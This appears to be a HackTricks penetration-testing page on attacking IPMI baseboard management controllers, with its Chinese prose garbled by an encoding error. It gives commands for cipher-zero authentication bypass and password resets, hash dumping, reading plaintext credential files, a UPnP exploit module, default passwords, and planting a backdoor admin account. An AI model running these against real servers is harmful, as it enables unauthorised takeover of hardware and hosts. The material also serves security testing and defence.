# 623/UDP/TCP - IPMI

## 623/UDP/TCP - IPMI

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## åŸºæœ¬ä¿¡æ¯

### **IPMI æ¦‚è¿°**

**[æ™ºèƒ½å¹³å°ç®¡ç†æ¥å£ (IPMI)](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)** æä¾›äº†ä¸€ç§æ ‡å‡†åŒ–çš„æ–¹æ³•ï¼Œç”¨äºè¿œç¨‹ç®¡ç†å’Œç›‘æ§è®¡ç®—æœºç³»ç»Ÿï¼Œç‹¬ç«‹äºæ“ä½œç³»ç»Ÿæˆ–ç”µæºçŠ¶æ€ã€‚è¯¥æŠ€æœ¯å…è®¸ç³»ç»Ÿç®¡ç†å‘˜è¿œç¨‹ç®¡ç†ç³»ç»Ÿï¼Œå³ä½¿åœ¨ç³»ç»Ÿå…³é—­æˆ–æ— å“åº”æ—¶ï¼Œç‰¹åˆ«é€‚ç”¨äºï¼š

- æ“ä½œç³»ç»Ÿå¯åŠ¨å‰çš„é…ç½®
- å…³æœºç®¡ç†
- ä»ç³»ç»Ÿæ•…éšœä¸­æ¢å¤

IPMI èƒ½å¤Ÿç›‘æ§æ¸©åº¦ã€ç”µå‹ã€é£æ‰‡é€Ÿåº¦å’Œç”µæºï¼ŒåŒæ—¶æä¾›åº“å­˜ä¿¡æ¯ã€æŸ¥çœ‹ç¡¬ä»¶æ—¥å¿—ï¼Œå¹¶é€šè¿‡ SNMP å‘é€è­¦æŠ¥ã€‚å…¶æ“ä½œæ‰€éœ€çš„åŸºæœ¬æ¡ä»¶æ˜¯ç”µæºå’Œå±€åŸŸç½‘è¿æ¥ã€‚

è‡ª 1998 å¹´è‹±ç‰¹å°”æ¨å‡ºä»¥æ¥ï¼ŒIPMI å¾—åˆ°äº†ä¼—å¤šå‚å•†çš„æ”¯æŒï¼Œå¢å¼ºäº†è¿œç¨‹ç®¡ç†èƒ½åŠ›ï¼Œç‰¹åˆ«æ˜¯ 2.0 ç‰ˆæœ¬å¯¹ä¸²è¡Œå±€åŸŸç½‘çš„æ”¯æŒã€‚å…³é”®ç»„ä»¶åŒ…æ‹¬ï¼š

- **ä¸»æ¿ç®¡ç†æ§åˆ¶å™¨ (BMC)ï¼š** IPMI æ“ä½œçš„ä¸»è¦å¾®æ§åˆ¶å™¨ã€‚
- **é€šä¿¡æ€»çº¿å’Œæ¥å£ï¼š** ç”¨äºå†…éƒ¨å’Œå¤–éƒ¨é€šä¿¡ï¼ŒåŒ…æ‹¬ ICMBã€IPMB å’Œå„ç§æœ¬åœ°åŠç½‘ç»œè¿æ¥æ¥å£ã€‚
- **IPMI å†…å­˜ï¼š** ç”¨äºå­˜å‚¨æ—¥å¿—å’Œæ•°æ®ã€‚

![https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right](https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right)

**é»˜è®¤ç«¯å£**ï¼š623/UDP/TCPï¼ˆé€šå¸¸åœ¨ UDP ä¸Šï¼Œä½†ä¹Ÿå¯èƒ½åœ¨ TCP ä¸Šè¿è¡Œï¼‰

## æšä¸¾

### å‘ç°
```bash
nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
use  auxiliary/scanner/ipmi/ipmi_version
```
æ‚¨å¯ä»¥**è¯†åˆ«**ç‰ˆæœ¬ä½¿ç”¨ï¼š
```bash
use auxiliary/scanner/ipmi/ipmi_version
nmap -sU --script ipmi-version -p 623 10.10.10.10
```
### IPMI æ¼æ´

åœ¨ IPMI 2.0 çš„é¢†åŸŸä¸­ï¼ŒDan Farmer å‘ç°äº†ä¸€ä¸ªé‡å¤§çš„å®‰å…¨ç¼ºé™·ï¼Œé€šè¿‡ **cipher type 0** æš´éœ²äº†ä¸€ä¸ªæ¼æ´ã€‚è¿™ä¸ªæ¼æ´åœ¨ [Dan Farmer çš„ç ”ç©¶](http://fish2.com/ipmi/cipherzero.html) ä¸­æœ‰è¯¦ç»†è®°å½•ï¼Œå…è®¸åœ¨ç›®æ ‡æœ‰æ•ˆç”¨æˆ·çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨ä»»ä½•å¯†ç è¿›è¡Œæœªç»æˆæƒçš„è®¿é—®ã€‚è¿™ä¸ªå¼±ç‚¹åœ¨ HPã€Dell å’Œ Supermicro ç­‰åˆ¶é€ å•†çš„å„ç§ BMC ä¸­è¢«å‘ç°ï¼Œè¡¨æ˜æ‰€æœ‰ IPMI 2.0 å®ç°ä¸­å­˜åœ¨å¹¿æ³›çš„é—®é¢˜ã€‚

### **é€šè¿‡ Cipher 0 ç»•è¿‡ IPMI è®¤è¯**

è¦æ£€æµ‹è¿™ä¸ªç¼ºé™·ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ Metasploit è¾…åŠ©æ‰«æå™¨ï¼š
```bash
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```
åˆ©ç”¨è¿™ä¸ªæ¼æ´å¯ä»¥ä½¿ç”¨ `ipmitool` æ¥å®ç°ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œå…è®¸åˆ—å‡ºå’Œä¿®æ”¹ç”¨æˆ·å¯†ç ï¼š
```bash
apt-get install ipmitool # Installation command
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list # Lists users
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 # Changes password
```
### **IPMI 2.0 RAKP è®¤è¯è¿œç¨‹å¯†ç å“ˆå¸Œæ£€ç´¢**

æ­¤æ¼æ´å…è®¸æ£€ç´¢ä»»ä½•ç°æœ‰ç”¨æˆ·åçš„åŠ ç›å“ˆå¸Œå¯†ç ï¼ˆMD5 å’Œ SHA1ï¼‰ã€‚è¦æµ‹è¯•æ­¤æ¼æ´ï¼ŒMetasploit æä¾›äº†ä¸€ä¸ªæ¨¡å—ï¼š
```bash
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
```
### **IPMI åŒ¿åè®¤è¯**

è®¸å¤š BMC çš„é»˜è®¤é…ç½®å…è®¸â€œåŒ¿åâ€è®¿é—®ï¼Œå…¶ç‰¹å¾æ˜¯ç©ºç”¨æˆ·åå’Œå¯†ç å­—ç¬¦ä¸²ã€‚æ­¤é…ç½®å¯ä»¥è¢«åˆ©ç”¨æ¥é‡ç½®ä½¿ç”¨ `ipmitool` çš„å‘½åç”¨æˆ·å¸æˆ·çš„å¯†ç ï¼š
```bash
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 newpassword
```
### **Supermicro IPMI æ˜æ–‡å¯†ç **

IPMI 2.0 ä¸­çš„ä¸€ä¸ªå…³é”®è®¾è®¡é€‰æ‹©è¦æ±‚åœ¨ BMC ä¸­å­˜å‚¨æ˜æ–‡å¯†ç ä»¥è¿›è¡Œèº«ä»½éªŒè¯ã€‚Supermicro å°†è¿™äº›å¯†ç å­˜å‚¨åœ¨ `/nv/PSBlock` æˆ– `/nv/PSStore` ç­‰ä½ç½®å¼•å‘äº†é‡å¤§å®‰å…¨éšæ‚£ï¼š
```bash
cat /nv/PSBlock
```
### **Supermicro IPMI UPnP æ¼æ´**

Supermicro åœ¨å…¶ IPMI å›ºä»¶ä¸­åŒ…å«çš„ UPnP SSDP ç›‘å¬å™¨ï¼Œç‰¹åˆ«æ˜¯åœ¨ UDP ç«¯å£ 1900 ä¸Šï¼Œå¼•å…¥äº†ä¸¥é‡çš„å®‰å…¨é£é™©ã€‚æ ¹æ® [Rapid7 çš„æŠ«éœ²](https://blog.rapid7.com/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play) çš„è¯¦ç»†ä¿¡æ¯ï¼ŒIntel SDK for UPnP Devices ç‰ˆæœ¬ 1.3.1 ä¸­çš„æ¼æ´å…è®¸å¯¹ BMC è¿›è¡Œæ ¹è®¿é—®ï¼š
```bash
msf> use exploit/multi/upnp/libupnp_ssdp_overflow
```
### æš´åŠ›ç ´è§£

**HP åœ¨åˆ¶é€ è¿‡ç¨‹ä¸­éšæœºç”Ÿæˆå…¶** **é›†æˆç¯å…‰æ§åˆ¶ (iLO)** **äº§å“çš„é»˜è®¤å¯†ç **ã€‚è¿™ä¸€åšæ³•ä¸å…¶ä»–åˆ¶é€ å•†å½¢æˆå¯¹æ¯”ï¼Œåè€…å¾€å¾€ä½¿ç”¨**é™æ€é»˜è®¤å‡­æ®**ã€‚ä»¥ä¸‹æ˜¯å„ç§äº§å“çš„é»˜è®¤ç”¨æˆ·åå’Œå¯†ç çš„æ€»ç»“ï¼š

- **HP é›†æˆç¯å…‰æ§åˆ¶ (iLO)** ä½¿ç”¨**å·¥å‚éšæœºç”Ÿæˆçš„ 8 ä¸ªå­—ç¬¦å­—ç¬¦ä¸²**ä½œä¸ºå…¶é»˜è®¤å¯†ç ï¼Œå±•ç¤ºäº†æ›´é«˜çš„å®‰å…¨çº§åˆ«ã€‚
- åƒ**æˆ´å°”çš„ iDRACã€IBM çš„ IMM**å’Œ**å¯Œå£«é€šçš„é›†æˆè¿œç¨‹ç®¡ç†æ§åˆ¶å™¨**ç­‰äº§å“ä½¿ç”¨æ˜“äºçŒœæµ‹çš„å¯†ç ï¼Œå¦‚â€œcalvinâ€ã€â€œPASSW0RDâ€ï¼ˆå¸¦é›¶ï¼‰å’Œâ€œadminâ€ã€‚
- åŒæ ·ï¼Œ**Supermicro IPMI (2.0)ã€Oracle/Sun ILOM**å’Œ**åç¡• iKVM BMC**ä¹Ÿä½¿ç”¨ç®€å•çš„é»˜è®¤å‡­æ®ï¼Œå…¶ä¸­â€œADMINâ€ã€â€œchangemeâ€å’Œâ€œadminâ€ä½œä¸ºå®ƒä»¬çš„å¯†ç ã€‚

## é€šè¿‡ BMC è®¿é—®ä¸»æœº

å¯¹åŸºæ¿ç®¡ç†æ§åˆ¶å™¨ (BMC) çš„ç®¡ç†è®¿é—®æ‰“å¼€äº†è®¿é—®ä¸»æœºæ“ä½œç³»ç»Ÿçš„å„ç§é€”å¾„ã€‚ä¸€ç§ç®€å•çš„æ–¹æ³•æ˜¯åˆ©ç”¨ BMC çš„é”®ç›˜ã€è§†é¢‘ã€é¼ æ ‡ (KVM) åŠŸèƒ½ã€‚è¿™å¯ä»¥é€šè¿‡é‡å¯ä¸»æœºåˆ°æ ¹ shellï¼ˆä½¿ç”¨ `init=/bin/sh`ï¼‰æˆ–ä»è®¾ç½®ä¸ºæ•‘æ´ç£ç›˜çš„è™šæ‹Ÿ CD-ROM å¯åŠ¨æ¥å®ç°ã€‚è¿™äº›æ–¹æ³•å…è®¸ç›´æ¥æ“ä½œä¸»æœºçš„ç£ç›˜ï¼ŒåŒ…æ‹¬æ’å…¥åé—¨ã€æ•°æ®æå–æˆ–è¿›è¡Œå®‰å…¨è¯„ä¼°æ‰€éœ€çš„ä»»ä½•æ“ä½œã€‚ç„¶è€Œï¼Œè¿™éœ€è¦é‡å¯ä¸»æœºï¼Œè¿™æ˜¯ä¸€ä¸ªæ˜¾è‘—çš„ç¼ºç‚¹ã€‚åœ¨ä¸é‡å¯çš„æƒ…å†µä¸‹ï¼Œè®¿é—®æ­£åœ¨è¿è¡Œçš„ä¸»æœºæ›´ä¸ºå¤æ‚ï¼Œå¹¶ä¸”å› ä¸»æœºçš„é…ç½®è€Œå¼‚ã€‚å¦‚æœä¸»æœºçš„ç‰©ç†æˆ–ä¸²è¡Œæ§åˆ¶å°ä¿æŒç™»å½•çŠ¶æ€ï¼Œå¯ä»¥é€šè¿‡ BMC çš„ KVM æˆ–ä¸²è¡Œé€šè¿‡ LAN (sol) åŠŸèƒ½è½»æ¾æ¥ç®¡ï¼Œä½¿ç”¨ `ipmitool`ã€‚æ¢ç´¢å…±äº«ç¡¬ä»¶èµ„æºçš„åˆ©ç”¨ï¼Œå¦‚ i2c æ€»çº¿å’Œè¶…çº§ I/O èŠ¯ç‰‡ï¼Œæ˜¯ä¸€ä¸ªéœ€è¦è¿›ä¸€æ­¥ç ”ç©¶çš„é¢†åŸŸã€‚

## ä»ä¸»æœºå‘ BMC å¼•å…¥åé—¨

åœ¨æ”»é™·ä¸€å°é…å¤‡ BMC çš„ä¸»æœºåï¼Œ**å¯ä»¥åˆ©ç”¨æœ¬åœ° BMC æ¥å£æ’å…¥åé—¨ç”¨æˆ·è´¦æˆ·**ï¼Œåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºæŒä¹…å­˜åœ¨ã€‚è¿™ä¸€æ”»å‡»éœ€è¦åœ¨è¢«æ”»é™·çš„ä¸»æœºä¸Šå­˜åœ¨**`ipmitool`**å¹¶æ¿€æ´» BMC é©±åŠ¨ç¨‹åºæ”¯æŒã€‚ä»¥ä¸‹å‘½ä»¤è¯´æ˜äº†å¦‚ä½•ä½¿ç”¨ä¸»æœºçš„æœ¬åœ°æ¥å£å°†æ–°ç”¨æˆ·è´¦æˆ·æ³¨å…¥ BMCï¼Œä»è€Œç»•è¿‡èº«ä»½éªŒè¯çš„éœ€è¦ã€‚è¿™ä¸€æŠ€æœ¯é€‚ç”¨äºåŒ…æ‹¬ Linuxã€Windowsã€BSD ç”šè‡³ DOS åœ¨å†…çš„å¹¿æ³›æ“ä½œç³»ç»Ÿã€‚
```bash
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)

ipmitool user set name 4 backdoor
ipmitool user set password 4 backdoor
ipmitool user priv 4 4
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)
4  backdoor        true    false      true      ADMINISTRATOR
```
## Shodan

* `port:623`

## References

* [https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
